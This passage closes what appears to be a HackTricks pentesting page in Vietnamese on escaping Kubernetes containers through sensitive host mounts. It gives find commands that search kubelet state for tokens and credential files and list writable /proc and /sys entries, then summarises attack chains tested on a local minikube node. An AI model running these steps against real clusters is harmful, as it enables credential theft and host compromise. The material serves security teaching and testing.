find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Điều đáng chú ý ở đây:

- Host root, `/proc`, `/sys`, `/var` và các runtime socket đều là những phát hiện cần ưu tiên cao.
- Các mục proc/sys có quyền ghi thường cho thấy mount đang để lộ các điều khiển kernel toàn cục của host thay vì một chế độ xem container an toàn.
- Các đường dẫn `/var` được mount cần được rà soát thông tin xác thực và workload lân cận, không chỉ rà soát filesystem.
- Các thư mục trạng thái Kubelet và đường dẫn CNI/plugin cần được ưu tiên tương đương runtime socket vì chúng thường nằm ngay trên đường tạo pod và phân phối thông tin xác thực của node.

## Trạng thái xác thực cục bộ

Các chuỗi khai thác thực tế trên trang này đã được kiểm tra trên một node Linux minikube cục bộ. Việc xác thực đã tái hiện được:

- quyền đọc và ghi thông qua một hostPath tạm thời có thể ghi
- phát hiện ServiceAccount token được chiếu và Secrets được mount thông qua `/var/lib/kubelet/pods`
- xác thực Kubernetes API thành công bằng token còn hiệu lực được khôi phục từ trạng thái kubelet đã mount
- phát hiện chỉ đọc filesystem `overlay2` của Docker lân cận thông qua `/var` đã mount
- tạo container cùng cấp bằng Docker API với host bind chỉ đọc thông qua `docker.sock` đã mount
- thực thi host bị trì hoãn thông qua một hook tạm thời được host tiêu thụ
- mô phỏng CNI-wrapper vẫn giữ nguyên các đối số, đầu vào chuẩn và quá trình thực thi của plugin gốc

Node đó cũng để lộ `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` và `config.gz`, nhưng không để lộ `uevent_helper`, biến EFI, các mục thermal hoặc `sched_debug`. Các trigger kernel có tính phá hoại không được thực thi. Điều này xác nhận rằng các chuỗi khai thác liên quan đến host-root, `/var`, trạng thái kubelet, socket và host-consumer có thể tái hiện được, trong khi các kỹ thuật helper procfs/sysfs phải được xem là có điều kiện tùy theo kernel, chế độ mount, đường dẫn payload và trigger cụ thể.

## References

- [1] [Các tệp và đường dẫn cục bộ được Kubelet sử dụng](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [container cilium-agent có thể truy cập host thông qua mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
